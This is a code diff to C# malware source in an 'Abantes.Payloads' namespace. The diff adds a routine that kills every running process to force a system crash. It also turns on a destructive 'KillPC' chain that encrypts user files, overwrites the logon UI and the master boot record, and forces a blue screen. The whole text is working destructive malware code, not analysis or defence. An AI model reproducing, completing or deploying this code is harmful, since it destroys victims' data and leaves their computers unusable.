@@ -252,12 +252,27 @@ namespace Abantes.Payloads
             }
             catch { }
         }
+        public static void KillAll()
+        {
+            //This is here incase C++ NTRAISEHARDERROR doesn't work, it runs first so could still indefinitely cause a BSOD
+
+            Process[] allProcesses = Process.GetProcesses();
+
+            for (int i = 0; i < allProcesses.Length; i++)
+            {
+                try
+                {
+                    allProcesses[i].Kill();
+                } catch { }
+            }
+        }
         public static void KillPC()
         {
             EncryptUserFiles();
             LogonUIOverwrite();
-            //MBR_Overwrite();
-            MessageBox.Show("Death");
+            MBR_Overwrite();
+            KillAll();
+            FORCE_BSOD();
         }
     }
     class WatchDog
